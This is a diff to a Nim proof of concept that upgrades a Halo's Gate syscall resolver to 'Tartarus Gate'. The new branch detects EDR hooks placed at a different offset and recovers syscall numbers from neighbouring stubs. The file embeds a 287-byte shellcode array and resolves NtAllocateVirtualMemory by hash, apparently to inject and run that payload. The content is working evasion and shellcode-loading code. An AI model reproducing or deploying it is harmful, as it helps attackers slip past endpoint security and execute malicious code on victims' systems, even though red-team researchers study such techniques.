@@ -78,7 +78,7 @@ proc getTableEntry*(pImageBase : PVOID, pCurrentExportDirectory : PIMAGE_EXPORT_
             if cast[PBYTE](cast[ByteAddress](pFuncAddr) + 3)[] == 0xB8:
                 tableEntry.wSysCall = cast[PWORD](cast[ByteAddress](pFuncAddr) + 4)[]
                 return true
-            # Classic hook
+            # Halos Gate : Classic hook
             elif cast[PBYTE](cast[ByteAddress](pFuncAddr))[] == 0xE9:
                 for idx in countup(1,500):
                     if cast[PBYTE](cast[ByteAddress](pFuncAddr) + 3 + idx * UP)[] == 0xB8:
@@ -87,8 +87,15 @@ proc getTableEntry*(pImageBase : PVOID, pCurrentExportDirectory : PIMAGE_EXPORT_
                     if cast[PBYTE](cast[ByteAddress](pFuncAddr) + 3 + idx * DOWN)[] == 0xB8:
                         tableEntry.wSysCall = cast[PWORD](cast[ByteAddress](pFuncAddr) + 4 + (idx * DOWN))[] - cast[WORD](idx)
                         return true 
-            # Todo : Tartarus gate
-
+            # Tartarus Gate : Other hooks
+            elif cast[PBYTE](cast[ByteAddress](pFuncAddr) + 3)[] == 0xE9:
+                for idx in countup(1,500):
+                    if cast[PBYTE](cast[ByteAddress](pFuncAddr) + 3 + idx * UP)[] == 0xB8:
+                        tableEntry.wSysCall = cast[PWORD](cast[ByteAddress](pFuncAddr) + 4 + (idx * UP))[] + cast[WORD](idx)
+                        return true
+                    if cast[PBYTE](cast[ByteAddress](pFuncAddr) + 3 + idx * DOWN)[] == 0xB8:
+                        tableEntry.wSysCall = cast[PWORD](cast[ByteAddress](pFuncAddr) + 4 + (idx * DOWN))[] - cast[WORD](idx)
+                        return true
             #return true
         inc cx
     return false
@@ -162,7 +169,7 @@ proc NtWriteVirtualMemory*(ProcessHandle: HANDLE, BaseAddress: PVOID, Buffer: PV
 when isMainModule:
     
     when defined(amd64):
-        echo fmt"[i] Halo's Gate - A quick Nim implementation example, based on https://github.com/zimawhit3/HellsGateNim"
+        echo fmt"[i] Tartarus Gate - A quick Nim implementation example"
         
         var shellcode: array[287, byte] = [
         byte 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
@@ -187,7 +194,7 @@ when isMainModule:
         0x65,0x00]
 
         if paramCount() != 0:
-            echo fmt"[!] Usage: .\Hellsgate.exe"
+            echo fmt"[!] Usage: .\TartarusGate.exe"
         else:
             var 
                 funcHash        : uint64            = djb2_hash("NtAllocateVirtualMemory")
